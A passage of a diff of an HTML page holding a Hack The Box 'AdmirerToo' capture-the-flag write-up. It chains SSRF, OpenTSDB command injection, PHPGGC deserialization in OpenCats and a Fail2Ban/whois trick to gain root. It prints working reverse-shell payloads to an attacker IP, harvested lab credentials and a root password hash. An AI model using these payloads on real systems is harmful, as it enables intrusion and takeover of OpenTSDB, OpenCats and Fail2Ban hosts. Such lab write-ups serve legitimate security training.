     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>We get a hit:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1'
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1'
 10.10.11.137 - - [24/Mar/2022 15:13:24] &quot;GET / HTTP/1.0&quot; 302 -
 10.10.11.137 - - [24/Mar/2022 15:13:24] &quot;GET / HTTP/1.0&quot; 302 -</code></pre>
 </doc-codeblock></div>
 <p>We got the <code v-pre>index.html</code> source of target port 80. This simply means, we can access any locally running service.
 <figure class="content-center">
-    <img src="images/image3.png" alt="">
+    <img src="images/image3.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>As we saw in our initial port scan that three ports are filtered. Let’s try to access them via SSRF. Setup redirector for any of the three filtered ports.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242'</code></pre>
 </doc-codeblock></div>
 <p>Intercept the login request once again and check the webpage.
 We got the response and the title of the page is &quot;OpenTSDB&quot;.
 <figure class="content-center">
-    <img src="images/image4.png" alt="">
+    <img src="images/image4.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>According to <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-18666/product_id-47794/Opentsdb-Opentsdb.html">CVE Details</a> there are 4 vulnerabilities for &quot;OpenTSDB&quot;. Two of them are Code Execution. But we need to find the right version information of running application. To get version information, we can use the below endpoint.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/api/version'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/api/version'</code></pre>
 </doc-codeblock></div>
 <p>After setting the redirector for the version endpoint, capture the login request and modify it a previously and forward it to server.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-json"><code v-pre class="language-json">{&quot;short_revision&quot;:&quot;14ab3ef&quot;,&quot;repo&quot;:&quot;/home/hobbes/OFFICIAL/build&quot;,&quot;host&quot;:&quot;clhbase&quot;,&quot;version&quot;:&quot;2.4.0&quot;,&quot;full_revision&quot;:&quot;14ab3ef8a865816cf920aa69f2e019b7261a7847&quot;,&quot;repo_status&quot;:&quot;MINT&quot;,&quot;user&quot;:&quot;hobbes&quot;,&quot;branch&quot;:&quot;master&quot;,&quot;timestamp&quot;:&quot;1545014415&quot;}</code></pre>
+<pre translate="no" class="language-json"><code v-pre class="language-json">{&quot;short_revision&quot;:&quot;14ab3ef&quot;,&quot;repo&quot;:&quot;/home/hobbes/OFFICIAL/build&quot;,&quot;host&quot;:&quot;clhbase&quot;,&quot;version&quot;:&quot;2.4.0&quot;,&quot;full_revision&quot;:&quot;14ab3ef8a865816cf920aa69f2e019b7261a7847&quot;,&quot;repo_status&quot;:&quot;MINT&quot;,&quot;user&quot;:&quot;hobbes&quot;,&quot;branch&quot;:&quot;master&quot;,&quot;timestamp&quot;:&quot;1545014415&quot;}</code></pre>
 </doc-codeblock></div>
 <p>Alright, we got the version information. It is using 2.4.0 and RCE via command injection exists in this version. The POC is already available for this vulnerability <a href="https://github.com/OpenTSDB/opentsdb/issues/2051">here</a>.
 Lets modify the POC to send a ping to our machine first:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27ping+-c+4+10.10.14.3%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27ping+-c+4+10.10.14.3%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
 </doc-codeblock></div>
 <p>After forwarding the request, we’d get this error page. The important part of this is mentioned at the end of the error:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-json"><code v-pre class="language-json">...[snip]...
+<pre translate="no" class="language-json"><code v-pre class="language-json">...[snip]...
 
 No such name for 'metrics': 'sys.cpu.nice'\n\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:450) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.uid.UniqueId$1GetIdCB.call(UniqueId.java:447) ~[tsdb-2.4.0.jar:14ab3ef]\n\t... 34 common frames omitted\n&quot;}</code></pre>
 </doc-codeblock></div>
 <p>The error is triggered because the <code v-pre>metrics</code> which we used (sys.cpu.nice) is not available, so it couldn’t complete the code execution. Lets find the metrics looking at the <a href="http://opentsdb.net/docs/build/html/api_http/suggest.html">documentation</a>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/api/suggest?type=metrics'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/api/suggest?type=metrics'</code></pre>
 </doc-codeblock></div>
 <p>We get a response back:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">[&quot;http.stats.web.hits&quot;]</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">[&quot;http.stats.web.hits&quot;]</code></pre>
 </doc-codeblock></div>
 <p>Let’s modify our redirect link accordingly:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27ping+-c+4+10.10.14.4%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27ping+-c+4+10.10.14.4%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
 </doc-codeblock></div>
 <p>Success! We get RCE!
 <figure class="content-center">
-    <img src="images/image5.png" alt="">
+    <img src="images/image5.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -456,7 +456,7 @@ No such name for 'metrics': 'sys.cpu.nice'\n\tat net.opentsdb.uid.UniqueId$1GetI
 </doc-anchor-target>
 <p>Ok, now lets get a reverse shell. Make sure to put the payload inside single quotes and urlencode:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash"># ORIGINAL
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"># ORIGINAL
 '/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.4/9001 0&gt;&amp;1&quot;'
 
 # URL ENCODED
@@ -464,7 +464,7 @@ No such name for 'metrics': 'sys.cpu.nice'\n\tat net.opentsdb.uid.UniqueId$1GetI
 </doc-codeblock></div>
 <p>Setup the redirector with our urlencoded command:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%34%2f%39%30%30%31%20%30%3e%26%31%22%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%34%2f%39%30%30%31%20%30%3e%26%31%22%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
 </doc-codeblock></div>
 <p>Start a netcat listener on port 9001, intercept the database login and modify the parameters to trigger the SSRF -&gt; RCE and we are in:
 <img src="images/image6.png" alt="" /></p>
@@ -476,7 +476,7 @@ No such name for 'metrics': 'sys.cpu.nice'\n\tat net.opentsdb.uid.UniqueId$1GetI
 </doc-anchor-target>
 <p>From here we can get the <code v-pre>/etc/passwd</code> to check the users in the machine:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">opentsdb@admirertoo:/$ cat /etc/passwd | grep sh$
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">opentsdb@admirertoo:/$ cat /etc/passwd | grep sh$
 
 root:x:0:0:root:/root:/bin/bash
 jennifer:x:1002:100::/home/jennifer:/bin/bash</code></pre>
@@ -490,7 +490,7 @@ jennifer:x:1002:100::/home/jennifer:/bin/bash</code></pre>
 </doc-anchor-target>
 <p>Enumerating the machine we find credentials in the plugins directory of adminer:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">opentsdb@admirertoo:/$ cat /var/www/adminer/plugins/data/servers.php     
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">opentsdb@admirertoo:/$ cat /var/www/adminer/plugins/data/servers.php     
 
 &lt;?php
 return [
@@ -509,7 +509,7 @@ return [
 </doc-codeblock></div>
 <p>After trying some combinations I finally get a successfull SSH login using <code v-pre>jennifer:bQ3u7^AxzcB7qAsxE3</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ ssh jennifer@10.10.11.137
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ ssh jennifer@10.10.11.137
 jennifer@10.10.11.137 password: 
 Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
 
@@ -532,7 +532,7 @@ jennifer@admirertoo:~$</code></pre>
 <p>We can read the <code v-pre>flag.txt</code> in the home directory.
 While enumerating the machine we find a webserver running internally on port 8080:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ netstat -antup
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ netstat -antup
 Active Internet connections (servers and established)                                                                                                       
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                                                            
 tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                                                                           
@@ -542,7 +542,7 @@ tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      
 </doc-codeblock></div>
 <p>Running a simple <code v-pre>curl</code> command we can get a grasp of it:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ curl -i localhost:8080                                                                                                               
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ curl -i localhost:8080                                                                                                               
 HTTP/1.1 200 OK                                                                                                                                             
 Date: Thu, 24 Mar 2022 08:26:00 GMT                                                                                                                         
 Server: Apache/2.4.38 (Debian)                                                                                                                              
@@ -571,7 +571,7 @@ Content-Type: text/html; charset=UTF-8
 </doc-anchor-target>
 <p>Enumerating the services running on the machine we see another interesting thing:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ systemctl list-units --type=service
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ systemctl list-units --type=service
 UNIT                               LOAD   ACTIVE SUB     DESCRIPTION                                                       
 apache2.service                    loaded active running The Apache HTTP Server                                            
 apache2@opencats.service           loaded active running The Apache HTTP Server                                            
@@ -584,7 +584,7 @@ fail2ban.service                   loaded active running Fail2Ban Service
 </doc-codeblock></div>
 <p>We confirm that &quot;OpenCats&quot; is running (<code v-pre>apache2@opencats.service</code>) but also Fail2Ban (<code v-pre>fail2ban.service</code>).  Lets see what version:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ fail2ban-server -V  
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:~$ fail2ban-server -V  
 Fail2Ban v0.10.2</code></pre>
 </doc-codeblock></div>
 <p>This version in particular has a <a href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm">RCE vulnerability</a> in mailing action using mailutils.</p>
@@ -596,11 +596,11 @@ Fail2Ban v0.10.2</code></pre>
 </doc-anchor-target>
 <p>First lets forward the port 8080 via SSH so we can have a look at the OpenCats website. I will forward port 8080 to my local port 9000:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ ssh -L 9000:127.0.0.1:8080 jennifer@10.10.11.137</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ ssh -L 9000:127.0.0.1:8080 jennifer@10.10.11.137</code></pre>
 </doc-codeblock></div>
 <p>Browsing to http://localhost:9000/ we see OpenCats website and version 0.9.5.2:
 <figure class="content-center">
-    <img src="images/image7.png" alt="">
+    <img src="images/image7.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -613,7 +613,7 @@ Fail2Ban v0.10.2</code></pre>
 </doc-anchor-target>
 <p>We can find credentials for the website database looking at <code v-pre>/opt/opencats/config.php</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">/* Database configuration. */                                                                                                                               
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">/* Database configuration. */                                                                                                                               
 define('DATABASE_USER', 'cats');                                                                                                                            
 define('DATABASE_PASS', 'adm1r3r0fc4ts');                                                                                                                   
 define('DATABASE_HOST', 'localhost');                                                                                                                       
@@ -621,7 +621,7 @@ define('DATABASE_NAME', 'cats_dev');</code></pre>
 </doc-codeblock></div>
 <p>We can now access the database and update the <code v-pre>admin</code> password with our own.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/opt/opencats$ mysql -u cats -p
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/opt/opencats$ mysql -u cats -p
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 2926
 Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10
@@ -650,18 +650,18 @@ MariaDB [cats_dev]&gt; select * from user\G
 </doc-codeblock></div>
 <p>Create a password:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ echo -n password123 | md5sum
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ echo -n password123 | md5sum
 482c811da5d5b4bc6d497ffa98491e38  -</code></pre>
 </doc-codeblock></div>
 <p>Update the <code v-pre>admin</code> password in the database:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">MariaDB [cats_dev]&gt; update user set password=&quot;482c811da5d5b4bc6d497ffa98491e38&quot; where user_id=1;
+<pre translate="no" class="language-none"><code v-pre class="language-none">MariaDB [cats_dev]&gt; update user set password=&quot;482c811da5d5b4bc6d497ffa98491e38&quot; where user_id=1;
 Query OK, 1 row affected (0.002 sec)
 Rows matched: 1  Changed: 1  Warnings: 0</code></pre>
 </doc-codeblock></div>
 <p>Great, now we can login as <code v-pre>admin:password123</code> in the website portal:
 <figure class="content-center">
-    <img src="images/image8.png" alt="">
+    <img src="images/image8.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -674,7 +674,7 @@ Rows matched: 1  Changed: 1  Warnings: 0</code></pre>
 </doc-anchor-target>
 <p>For this to work we need to switch to activities tab, click on <code v-pre>date</code> and intercept the request in Burp Suite:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A8%3A%7Bs%3A10%3A%22rangeStart%22%3Bi%3A0%3Bs%3A10%3A%22maxResults%22%3Bi%3A15%3Bs%3A13%3A%22filterVisible%22%3Bb%3A0%3Bs%3A9%3A%22startDate%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22endDate%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22period%22%3Bs%3A37%3A%22DATE_SUB%28CURDATE%28%29%2C+INTERVAL+1+MONTH%29%22%3Bs%3A6%3A%22sortBy%22%3Bs%3A15%3A%22dateCreatedSort%22%3Bs%3A13%3A%22sortDirection%22%3Bs%3A4%3A%22DESC%22%3B%7D HTTP/1.1
+<pre translate="no" class="language-none"><code v-pre class="language-none">GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A8%3A%7Bs%3A10%3A%22rangeStart%22%3Bi%3A0%3Bs%3A10%3A%22maxResults%22%3Bi%3A15%3Bs%3A13%3A%22filterVisible%22%3Bb%3A0%3Bs%3A9%3A%22startDate%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22endDate%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22period%22%3Bs%3A37%3A%22DATE_SUB%28CURDATE%28%29%2C+INTERVAL+1+MONTH%29%22%3Bs%3A6%3A%22sortBy%22%3Bs%3A15%3A%22dateCreatedSort%22%3Bs%3A13%3A%22sortDirection%22%3Bs%3A4%3A%22DESC%22%3B%7D HTTP/1.1
 Host: localhost:9000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -688,13 +688,13 @@ Upgrade-Insecure-Requests: 1</code></pre>
 <p>According to the blog, <code v-pre>activity</code> parameter is vulnerable. So, we need to generate serialized exploit using PHPGGC and replace it with default one. We can use <a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a>.
 First we can simply create a file in <code v-pre>/dev/shm</code> to check its permissions and user details:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ echo &quot;Caue was here&quot; &gt; test.txt
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ echo &quot;Caue was here&quot; &gt; test.txt
 $ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/test.txt /home/caue/htb/admirertoo/test.txt
 a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A14%3A%22Caue+was+here%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Ftest.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</code></pre>
 </doc-codeblock></div>
 <p>Replacing the generated serialized object above with the one in <code v-pre>DataGrid</code> parameter we get the exploit to work. If we look at <code v-pre>/dev/shm/</code> we can see our file:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ ls -la
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ ls -la
 total 4
 drwxrwxrwt  2 root  root    60 Mar 24 09:10 .
 drwxr-xr-x 16 root  root  3080 Mar 24 06:04 ..
@@ -705,7 +705,7 @@ jennifer@admirertoo:/dev/shm$</code></pre>
 </doc-codeblock></div>
 <p>Things to note here is that the file was created by <code v-pre>devel</code> user and not <code v-pre>root</code>. Devel does not have any shell access (see <code v-pre>/etc/passwd</code> below) so it is probably useless to get a shell as him:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ grep 'devel' /etc/passwd
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ grep 'devel' /etc/passwd
 devel:x:1003:1003::/home/devel:/sbin/nologin</code></pre>
 </doc-codeblock></div>
 <p>Dead end.</p>
@@ -719,7 +719,7 @@ devel:x:1003:1003::/home/devel:/sbin/nologin</code></pre>
 But, we can put a whois configuration file in <code v-pre>/usr/local/etc</code> directory and when we execute whois command it takes configuration file for processing.
 This is the default configuration of jail (fail2ban), if any IP is banned then it sends an email to specified address.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ cat /etc/fail2ban/jail.local  
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ cat /etc/fail2ban/jail.local  
 [DEFAULT]  
 ignoreip = 127.0.0.1  
 bantime = 60s  
@@ -731,7 +731,7 @@ action = %(action_mwl)s</code></pre>
 </doc-codeblock></div>
 <p>The configuration file below says that Fail2Ban is enabled in SSH:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ cat /etc/fail2ban/jail.d/defaults-debian.conf  
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ cat /etc/fail2ban/jail.d/defaults-debian.conf  
 [sshd]  
 enabled = true</code></pre>
 </doc-codeblock></div>
@@ -744,44 +744,44 @@ enabled = true</code></pre>
 <p>We will use OpenCats deserialization vulnerability to write a malicious <code v-pre>whois</code> configuration file that is pointing to our machine. Then we create another file that will send us a reverse shell and it is triggered whenever Fail2Ban sends an email - in another words, when someone tries to SSH login with wrong credentials multiple times.</p>
 <p>Step 1 - Create a configuration file:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ cat caue.conf  
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ cat caue.conf  
 }]|. [10.10.14.4]</code></pre>
 </doc-codeblock></div>
 <p>Step 2 - Serialize the configuration file to overwrite <code v-pre>/usr/local/etc/whois.conf</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /home/caue/htb/admirertoo/caue.conf
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /home/caue/htb/admirertoo/caue.conf
 a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A18%3A%22%7D%5D%7C.+%5B10.10.14.4%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</code></pre>
 </doc-codeblock></div>
 <p>Step 3 - We create a local shell file that we’ll use to get a reverse shell to our own box:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ cat shell
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ cat shell
 ~| bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.4/9001 0&gt;&amp;1&quot; &amp;</code></pre>
 </doc-codeblock></div>
 <p>Step 4 - Start a netcat listener on port 43 (whois) &amp; on port 9001 to receive the shell:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ nc -nvlkp 43 -c &quot;cat shell&quot;
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ nc -nvlkp 43 -c &quot;cat shell&quot;
 ---
 $ nc -lnvp 9001</code></pre>
 </doc-codeblock></div>
 <p><figure class="content-center">
-    <img src="images/image9.png" alt="">
+    <img src="images/image9.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Step 5 - Now we go to the OpenCats website, click on the vulnerable &quot;Date&quot;, intercept the request and modify the parameter with our generated serialized object of step 2.</p>
 <p>Step 6 - Test -&gt; Run whois to our machine:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ whois 10.10.14.4</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">jennifer@admirertoo:/dev/shm$ whois 10.10.14.4</code></pre>
 </doc-codeblock></div>
 <p>And we get a hit back in our netcat listening on port 43! Nice!
 Lets set the netcat for the whois back up again:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ nc -nvlkp 43 -c &quot;cat shell&quot;</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ nc -nvlkp 43 -c &quot;cat shell&quot;</code></pre>
 </doc-codeblock></div>
 <p>Step 7 - Spam the SSH login to get banned and trigger Fail2Ban
 At this moment our payload is already delivered to target machine, now we need to trigger Fail2Ban application via failed SSH attempts:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ ssh root@10.10.11.137
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ ssh root@10.10.11.137
 root@10.10.11.137's password: 
 Permission denied, please try again.
 root@10.10.11.137's password: 
@@ -790,7 +790,7 @@ root@10.10.11.137's password:</code></pre>
 </doc-codeblock></div>
 <p>And we are ROOT.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">$ nc -lnvp 9001                                                                                                                                             
+<pre translate="no" class="language-none"><code v-pre class="language-none">$ nc -lnvp 9001                                                                                                                                             
 listening on [any] 9001 ...                                                                                                                                 
 connect to [10.10.14.4] from (UNKNOWN) [10.10.11.137] 50568                                                                                                 
 bash: cannot set terminal process group (3475): Inappropriate ioctl for device                                                                              
@@ -810,30 +810,30 @@ lrwxrwxrwx  1 root root    9 Jul  8  2021 .mysql_history -&gt; /dev/null
 -rw-------  1 root root 9755 Jan 12 10:20 .viminfo</code></pre>
 </doc-codeblock></div>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">root:$6$eP5MVyB1lXtVQgzU$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7:::</code></pre>
